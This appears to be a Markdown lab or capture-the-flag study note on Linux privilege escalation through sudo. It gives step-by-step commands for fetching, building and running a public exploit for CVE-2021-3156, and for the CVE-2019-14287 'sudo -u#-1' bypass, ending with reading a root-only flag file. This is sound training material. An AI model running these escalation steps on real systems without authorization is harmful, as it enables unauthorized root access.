
## <span style="color:#8BE9FD">What is `sudo`?</span>
- `sudo` = run commands as another user (usually root)
- It's safer than giving full root access
- What you can run with `sudo` is controlled by the `/etc/sudoers` file
- Use this to check your sudo powers `sudo -l`

___
# <span style="color:#FF5555">Method 1: CVE-2021-3156 (sudo bug)</span>

This is a **serious vulnerability** found in `sudo` that lets any user become **root**, even if they aren't allowed to run anything with `sudo`.

🧨 Affected versions include:

- `1.8.31` (Ubuntu 20.04)
- `1.8.27` (Debian 10)
- `1.9.2` (Fedora 33)

### <span style="color:#50FA7B">🔍 Step-by-step:</span>

#### <span style="color:#FFB86C">1. Check sudo version:</span>
```bash
sudo -V | head -n 1

# output
# Sudo version 1.8.31
```
2. Clone the exploit:
```bash
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
```
3. Compile it:
```bash
make
```
4. Run the exploit:
```bash
./sudo-hax-me-a-sandwich
```
You’ll see available targets like:
```bash
1) Ubuntu 20.04 - sudo 1.8.31
```
5. Run with correct ID (for Ubuntu 20.04, ID is 1):
```bash
./sudo-hax-me-a-sandwich 1
```
Now you’re root!

___
# <span style="color:#FF5555">Method 2: CVE-2019-14287 (`sudo -u#-1` trick)</span>

If you're allowed to run **any command** as **any user**, you can **bypass root restrictions** with this trick.

#### <span style="color:#FFB86C">1. Check sudo rights:</span>

```bash
sudo -l

# Output
# User cry0l1t3 may run the following commands:
#   (ALL) /usr/bin/id
```
2. Try the bypass:
```bash
sudo -u#-1 /usr/bin/id

# Output
# uid=0(root) gid=1005(cry0l1t3)
```
You just became root using a number trick! (`-1` becomes `0`, which is root)
3. Get the flag:
```bash
sudo -u#-1 cat /root/flag.txt
```

